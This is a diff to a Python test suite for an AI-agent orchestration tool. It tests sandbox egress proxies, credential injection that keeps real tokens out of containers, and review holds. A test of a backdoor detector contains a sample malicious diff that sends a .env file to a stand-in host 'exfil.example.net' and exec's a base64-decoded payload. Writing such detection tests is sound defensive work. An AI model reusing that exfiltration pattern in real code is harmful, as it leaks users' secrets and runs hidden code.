@@ -539,9 +539,10 @@ assert not _held_before([], "g", "f1")
 ledger.record("escalation.raised", goal_id="g", feature_id="f1", root=hr,
               reason_class="held_for_review", reason="sign off")
 assert _held_before(ledger.read(hr), "g", "f1")   # a prior hold means it was resolved -> land
-# the two classes that can break something no test covers hold by default — a
-# spec that says nothing must not mean "land the ledger schema unread"
-assert load_spec(rr).review_hold == ("spine", "boundary")
+# the classes that can break something no test covers, or run on your machine
+# once landed, hold by default — a spec that says nothing must not mean "land
+# the ledger schema unread", nor "land a new SessionStart hook unread"
+assert load_spec(rr).review_hold == ("spine", "boundary", "exec", "suspect")
 assert load_spec(rr).pr_base == "main"
 # and an explicit empty list still opts out
 (rr / "plexus.toml").write_text((rr / "plexus.toml").read_text()
@@ -927,7 +928,8 @@ def test_a_routable_egress_network_is_reported_not_tolerated(monkeypatch):
     monkeypatch.setattr(sandbox.shutil, "which", lambda _n: "/usr/bin/docker")
     monkeypatch.setattr(sandbox, "allowlist", lambda: ["api.anthropic.com"])
     monkeypatch.setattr(sandbox, "local_model_hosts", lambda: [])
-    monkeypatch.setattr(sandbox, "_running_allow", lambda: "api.anthropic.com")
+    monkeypatch.setattr(sandbox, "_running_config", lambda _p: None)
+    monkeypatch.setattr("plexus.registry.detect_subscriptions", lambda: {})
     monkeypatch.setattr(sandbox, "_docker",
                         lambda *a, **k: (0, "false") if a[:2] == ("network", "inspect") else (0, ""))
     monkeypatch.setattr("heart.sandbox.image_is_stale", lambda _i: None)
@@ -954,7 +956,9 @@ def test_fix_creates_the_network_and_starts_the_proxy(monkeypatch, tmp_path):
     monkeypatch.setattr(sandbox, "_docker", fake)
     monkeypatch.setattr(sandbox, "allowlist", lambda: ["host.docker.internal:8001"])
     monkeypatch.setattr(sandbox, "local_model_hosts", lambda: [])
-    monkeypatch.setattr(sandbox, "_running_allow", lambda: None)
+    monkeypatch.setattr(sandbox, "_running_config", lambda _p: None)
+    monkeypatch.setattr("plexus.registry.detect_subscriptions", lambda: {})
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))   # no seat token saved
     monkeypatch.setattr(sandbox, "proxy_script", lambda: script)
     monkeypatch.setattr(sandbox, "reap", lambda: (0, 0))
     monkeypatch.setattr("heart.sandbox.image_is_stale", lambda _i: None)
@@ -967,3 +971,323 @@ def test_fix_creates_the_network_and_starts_the_proxy(monkeypatch, tmp_path):
     # that needs a leg in both
     assert "bridge" in run
     assert ("network", "connect", sandbox.NETWORK, sandbox.PROXY) in calls
+
+
+def _seat_home(monkeypatch, tmp_path, token: bool):
+    home = tmp_path / "home"
+    (home / ".claude").mkdir(parents=True)
+    (home / ".claude" / ".credentials.json").write_text("{}")
+    (home / ".claude.json").write_text("{}")
+    (home / ".codex").mkdir()
+    (home / ".codex" / "auth.json").write_text("{}")
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / ".config"))
+    monkeypatch.delenv("HEART_SANDBOX_HOME_FILES", raising=False)
+    monkeypatch.delenv("PLEXUS_SEAT", raising=False)
+    monkeypatch.delenv("PLEXUS_DEV_ENV", raising=False)
+    if token:
+        secrets = home / ".config" / "heart" / "secrets"
+        secrets.mkdir(parents=True)
+        (secrets / "anthropic").write_text("sk-ant-oat01-x")
+    return home
+
+
+def test_an_injected_seat_is_never_mounted(monkeypatch, tmp_path):
+    """With a seat token saved for the proxy, no Claude credential file enters
+    a container -- not .credentials.json, and not the 190-project ~/.claude.json
+    either. Codex has no injector route yet and keeps its mount."""
+    from plexus import registry
+
+    home = _seat_home(monkeypatch, tmp_path, token=True)
+    env = registry.seat_env()
+    assert env["HEART_SANDBOX_INJECT"] == "anthropic"
+    assert ".claude" not in env["HEART_SANDBOX_HOME_FILES"]
+    assert env["HEART_SANDBOX_HOME_FILES"] == str(home / ".codex" / "auth.json")
+    assert "sk-ant" not in str(env), "plexus names the route, never the token"
+
+    _seat_home(monkeypatch, tmp_path / "b", token=False)
+    assert "HEART_SANDBOX_INJECT" not in registry.seat_env()
+
+
+def test_a_signed_in_codex_seat_is_injected_not_mounted(monkeypatch, tmp_path):
+    """Codex's auth.json is already the file the proxy reads, so a ChatGPT
+    seat is injected with no step from the operator: the container gets a
+    stand-in carrying only the plan, and the real file never enters it."""
+    import base64
+    from plexus import registry, sandbox
+
+    home = _seat_home(monkeypatch, tmp_path, token=False)
+    seg = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
+    access = ".".join([seg({"alg": "none"}), seg({"exp": 9e9, "https://api.openai.com/auth":
+                                                   {"chatgpt_plan_type": "pro"}}), "x"])
+    (home / ".codex" / "auth.json").write_text(json.dumps(
+        {"auth_mode": "chatgpt", "tokens": {"access_token": access}}))
+    env = registry.seat_env()
+    assert env["HEART_SANDBOX_INJECT"] == "chatgpt"
+    assert env["HEART_SANDBOX_CODEX_PLAN"] == "pro"
+    assert ".codex" not in env.get("HEART_SANDBOX_HOME_FILES", "")
+    assert access not in str(env)
+    monkeypatch.setattr("plexus.registry.detect_subscriptions", lambda: {"codex": 200.0})
+    monkeypatch.delenv("HEART_SANDBOX_ENV", raising=False)
+    assert not any("chatgpt" in h or "openai" in h for h in sandbox.allowlist())
+    want = sandbox._wanted_config("")
+    assert want["codex"] and want["INJECT_PORT"] and want["secrets"], \
+        "the seed lives in secrets, so any injection mounts it"
+
+
+def test_the_sentinel_seed_is_private_stable_and_made_only_when_injecting(monkeypatch, tmp_path):
+    """The stand-in is worth something only to a container handed it; that
+    holds only if the seed is unreadable to anyone else and not recreated
+    under running containers."""
+    from plexus import registry
+
+    home = _seat_home(monkeypatch, tmp_path, token=False)
+    seed = home / ".config" / "heart" / "secrets" / "sentinel"
+    registry.seat_env()
+    assert not seed.exists(), "no injected seat, no seed"
+    seed.parent.mkdir(parents=True, mode=0o700)
+    (seed.parent / "anthropic").write_text("sk-ant-oat01-x")   # a seat is now injected
+    registry.seat_env()
+    assert seed.stat().st_mode & 0o777 == 0o600
+    assert seed.parent.stat().st_mode & 0o077 == 0
+    first = seed.read_text()
+    assert len(first) >= 40
+    registry.seat_env()
+    assert seed.read_text() == first
+
+
+def test_the_dev_environment_rides_along_and_can_be_left_home(monkeypatch, tmp_path):
+    """Settings, instructions, skills and plugins go in so a contained agent
+    works like the host one; PLEXUS_SEAT=off withholds seats, not conventions."""
+    from plexus import registry
+
+    home = _seat_home(monkeypatch, tmp_path, token=False)
+    (home / ".claude" / "settings.json").write_text("{}")
+    (home / ".claude" / "skills").mkdir()
+    (home / ".claude" / "plugins").mkdir()
+    monkeypatch.delenv("HEART_SANDBOX_HOME_DIRS", raising=False)
+    monkeypatch.setenv("PLEXUS_SEAT", "off")
+    env = registry.seat_env()
+    assert env["HEART_SANDBOX_HOME_FILES"] == str(home / ".claude" / "settings.json")
+    assert env["HEART_SANDBOX_HOME_DIRS"].split(",") == [
+        str(home / ".claude" / "skills"), str(home / ".claude" / "plugins")]
+    monkeypatch.setenv("PLEXUS_DEV_ENV", "off")
+    assert registry.seat_env() == {}
+
+
+def test_vendor_hosts_are_port_pinned_and_an_injected_one_is_dropped(monkeypatch, tmp_path):
+    """A bare name allows every port -- api.anthropic.com:8443 got through the
+    live proxy. And an injected seat's host is reached through the injector, so
+    listing it for CONNECT would only reopen the foreign-key path."""
+    from plexus import sandbox
+
+    _seat_home(monkeypatch, tmp_path, token=False)
+    monkeypatch.delenv("HEART_SANDBOX_ENV", raising=False)
+    monkeypatch.setattr("plexus.registry.detect_subscriptions",
+                        lambda: {"claude": 100.0, "codex": 20.0})
+    assert all(h.endswith(":443") for h in sandbox.allowlist())
+    assert "api.anthropic.com:443" in sandbox.allowlist()
+
+    _seat_home(monkeypatch, tmp_path / "b", token=True)
+    assert "api.anthropic.com:443" not in sandbox.allowlist()
+    assert "chatgpt.com:443" in sandbox.allowlist()
+
+
+def test_fix_provisions_a_web_lane_with_its_own_proxy_and_filter(monkeypatch, tmp_path):
+    from plexus import sandbox
+
+    script = tmp_path / "egress-proxy.py"
+    script.write_text("# proxy")
+    _seat_home(monkeypatch, tmp_path, token=True)
+    calls = []
+
+    def fake(*args, **kw):
+        calls.append(args)
+        return (1, "No such network") if args[:2] == ("network", "inspect") else (0, "")
+
+    monkeypatch.setattr(sandbox.shutil, "which", lambda _n: "/usr/bin/docker")
+    monkeypatch.setattr(sandbox, "_docker", fake)
+    monkeypatch.setattr(sandbox, "local_model_hosts", lambda: ["host.docker.internal:8001"])
+    monkeypatch.setattr(sandbox, "_running_config", lambda _p: None)
+    monkeypatch.setattr(sandbox, "proxy_script", lambda: script)
+    monkeypatch.setattr(sandbox, "reap", lambda: (0, 0))
+    monkeypatch.setattr("plexus.registry.detect_subscriptions", lambda: {"claude": 100.0})
+    monkeypatch.setattr("heart.sandbox.image_is_stale", lambda _i: None)
+
+    sandbox.doctor(fix=True)
+    assert ("network", "create", "--internal", sandbox.WEB_NETWORK) in calls
+    runs = {c[c.index("--name") + 1]: c for c in calls if c[0] == "run"}
+    web = runs[sandbox.WEB_PROXY]
+    assert "ALLOW=*,host.docker.internal:8001" in web
+    assert "9.9.9.9" in web, "the web lane resolves through the malware filter"
+    # a mounted seat's refresh would rotate the token and log the host out
+    assert any(a.startswith("DENY=") and "auth.openai.com" in a
+               and "platform.claude.com" in a for a in web)
+    assert "host.docker.internal:host-gateway" in web, "or the local model goes dark"
+    for proxy in (sandbox.PROXY, sandbox.WEB_PROXY):
+        assert f"INJECT_PORT={sandbox.INJECT_PORT}" in runs[proxy]
+        assert any(a.endswith(":/secrets:ro") for a in runs[proxy])
+    assert ("network", "connect", sandbox.WEB_NETWORK, sandbox.WEB_PROXY) in calls
+
+
+def test_acceptance_runs_where_a_verifier_would(monkeypatch, tmp_path):
+    """The acceptance command executes the agent's diff. It goes through
+    heart's contained runner -- which is the host only when no sandbox was
+    asked for -- with a writable throwaway tree."""
+    from plexus import run as _run
+
+    seen = []
+
+    def fake(command, cwd, timeout, writable=False):
+        seen.append((command, writable))
+        return subprocess.CompletedProcess(command, 0, "ok", "")
+
+    monkeypatch.setattr(_run, "run_contained", fake)
+    repo = tmp_path / "r"
+    repo.mkdir()
+    subprocess.run(["git", "init", "-q", str(repo)], check=True)
+    (repo / "a.txt").write_text("a\n")
+    subprocess.run(["git", "-C", str(repo), "add", "."], check=True)
+    subprocess.run(["git", "-C", str(repo), "-c", "user.email=t@t", "-c", "user.name=t",
+                    "commit", "-qm", "base"], check=True)
+    base = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"],
+                          capture_output=True, text=True).stdout.strip()
+    diff = ("diff --git a/b.txt b/b.txt\nnew file mode 100644\n--- /dev/null\n"
+            "+++ b/b.txt\n@@ -0,0 +1 @@\n+b\n")
+    ok, tail, _ = _run._run_acceptance(repo, base, diff, "python3 -m pytest -q", 30)
+    assert ok, tail
+    assert seen == [("python3 -m pytest -q", True)]
+
+
+def test_a_contained_planner_keeps_its_memory(tmp_path):
+    """The planner's retrieval came from a prompt hook that does not exist in a
+    container. The same hook, run on the host with the same prompt, supplies
+    it -- and a repo without the hook plans exactly as before."""
+    from plexus.plan import _retrieved
+
+    assert _retrieved(tmp_path, "plan it") == ""
+    hooks = tmp_path / ".arteries" / "hooks"
+    hooks.mkdir(parents=True)
+    (hooks / "hook-observe.sh").write_text(
+        'python3 -c "import json,sys; print(\'<retrieved>\' + json.load(sys.stdin)[\'prompt\'])"')
+    assert _retrieved(tmp_path, "plan it") == "<retrieved>plan it\n\n"
+    # retrieved for an agent, on the goal's lane (see arteries trust.py)
+    (hooks / "hook-observe.sh").write_text('echo "$ARTERIES_TRUST $ARTERIES_LANE"')
+    assert _retrieved(tmp_path, "plan it", "web") == "untrusted web\n\n"
+
+
+def test_a_diff_that_newly_gains_a_backdoor_capability_is_flagged(tmp_path):
+    """Deterministic, so a diff cannot talk it out of what it matches; and only
+    what is *new* to the file, so ordinary work in a module that already shells
+    out does not hold every feature."""
+    from plexus.review import suspicious
+
+    repo = tmp_path / "r"
+    (repo / "src").mkdir(parents=True)
+    (repo / "src" / "dates.py").write_text("def parse(s):\n    return s\n")
+    (repo / "src" / "run.py").write_text("import subprocess\nsubprocess.run(['ls'])\n")
+    subprocess.run(["git", "init", "-q", str(repo)], check=True)
+    subprocess.run(["git", "-C", str(repo), "add", "."], check=True)
+    subprocess.run(["git", "-C", str(repo), "-c", "user.email=t@t", "-c", "user.name=t",
+                    "commit", "-qm", "base"], check=True)
+    base = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"],
+                          capture_output=True, text=True).stdout.strip()
+
+    def diff(path, *lines):
+        return f"--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n" + "".join(f"+{l}\n" for l in lines)
+
+    flags = suspicious(repo, base, diff("src/dates.py",
+        "import urllib.request, base64",
+        "urllib.request.urlopen('https://exfil.example.net/?d=' + open('.env').read())",
+        "exec(base64.b64decode(PAYLOAD))"))
+    text = "\n".join(flags)
+    for expected in ("new network", "new dynamic code", "new decoding", "new host exfil.example.net"):
+        assert expected in text, (expected, flags)
+    # more of what the file already does is ordinary work
+    assert suspicious(repo, base, diff("src/run.py", "subprocess.run(['pwd'])")) == []
+    blob = "A" * 200
+    assert suspicious(repo, base, diff("src/run.py", f"DATA = '{blob}'")) == [
+        "src/run.py: encoded blob"]
+
+
+def test_a_web_lane_goal_is_reviewed_for_what_the_task_did_not_need(tmp_path):
+    from plexus.run import _roles
+
+    (tmp_path / "plexus.toml").write_text('[goal]\nid="g"\ntext="t"\n[ground_truth]\nsuite="true"\n')
+    spec = load_spec(tmp_path)
+    assert spec.pipeline, "a web-lane goal gets a reviewer by default"
+    review = next(r for r in _roles(spec) if r.get("review"))
+    assert "could browse the web" in review["prompt"] and "{prompt}" in review["prompt"]
+    (tmp_path / "plexus.toml").write_text(
+        '[goal]\nid="g"\ntext="t"\n[ground_truth]\nsuite="true"\n[agent]\nnetwork="api"\n')
+    assert not load_spec(tmp_path).pipeline, "an api-lane goal keeps the old default"
+
+
+def test_a_new_goal_starts_on_the_open_web_only_if_its_repo_is_public(tmp_path, monkeypatch):
+    """Unknown is private: a repo with no remote, no gh or no answer starts on
+    the api lane, where the repo has nowhere to go but the model."""
+    from plexus import spec as _spec
+
+    subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
+    _spec.init(tmp_path)
+    assert load_spec(tmp_path).network == "api"
+    monkeypatch.setattr(_spec, "default_network", lambda root: "web")
+    (tmp_path / "plexus.toml").unlink()
+    _spec.init(tmp_path)
+    assert load_spec(tmp_path).network == "web"
+
+
+def test_a_goal_gets_the_web_lane_unless_it_says_otherwise(tmp_path):
+    (tmp_path / "plexus.toml").write_text('[goal]\nid="g"\ntext="t"\n[ground_truth]\nsuite="true"\n')
+    assert load_spec(tmp_path).network == "web"
+    (tmp_path / "plexus.toml").write_text(
+        '[goal]\nid="g"\ntext="t"\n[ground_truth]\nsuite="true"\n[agent]\nnetwork="api"\n')
+    assert load_spec(tmp_path).network == "api"
+
+
+def test_a_diff_that_would_run_on_the_host_is_held_whatever_the_plan_said():
+    from plexus.review import exec_surface
+
+    assert exec_surface([".claude/settings.json", "src/app.py", "tests/unit/conftest.py",
+                         "pyproject.toml", "web/package.json", ".github/workflows/ci.yml",
+                         "lib/evil.pth", "docs/guide.md"]) == [
+        ".claude/settings.json", "tests/unit/conftest.py", "pyproject.toml",
+        "web/package.json", ".github/workflows/ci.yml", "lib/evil.pth"]
+    assert exec_surface(["src/claude/settings.py", "notes/Makefile.md"]) == []
+
+
+# --- a task that needs no plan gets a one-feature one, approved, and runs ---
+# Before this, `requires_plan: false` produced a task the board called runnable
+# and the runner refused: there was no path that ever wrote its plan file.
+from plexus import plan as _plan, serve as _serve, tasks as _tasks  # noqa: E402
+ap = tmp / "auto-plan-repo"; ap.mkdir()
+(ap / "plexus.toml").write_text(
+    '[goal]\nid="apgoal"\ntext="t"\n[ground_truth]\nsuite="python3 -m pytest -q"\n')
+apspec = load_spec(ap)
+one = _tasks.create(ap, "Rename the badge", body="just the label", requires_plan=False)
+feats = _plan.auto_plan(apspec, ap, one["id"])
+assert [f["id"] for f in feats] == [f"{one['id']}:main"], feats
+assert feats[0]["acceptance"] == "python3 -m pytest -q"
+assert feats[0]["touches"] == []          # nobody chose a file list -> unenforced
+assert _plan.load_plan(ap, one["id"])[0]["title"] == "Rename the badge"
+board = {t["id"]: t for t in _tasks.board(ap)["tasks"]}
+assert board[one["id"]]["state"] == "ready" and board[one["id"]]["plan_id"]
+# approval is per task: the project has no plan at all, the task does
+assert _serve._approved(ap, one["id"]) and not _serve._approved(ap)
+assert _serve._task_board(ap)["tasks"][0]["plan_approved"]
+# no suite means nothing could verify the work, so it refuses rather than
+# running an unplanned task unchecked
+(ap / "plexus.toml").write_text('[goal]\nid="apgoal"\ntext="t"\n[ground_truth]\nsuite=""\n')
+two = _tasks.create(ap, "Second job", requires_plan=False)
+try:
+    _plan.auto_plan(load_spec(ap), ap, two["id"])
+    raise AssertionError("ran with no ground truth")
+except SystemExit as exc:
+    assert "ground_truth" in str(exc), exc
+
+
+# --- recordings read back as lines: a repaint is one line, not two
+from plexus import tap as _tap, translog as _translog  # noqa: E402
+with _c.redirect_stdout(_io.StringIO()):
+    _translog.demo()
+    _tap.demo()
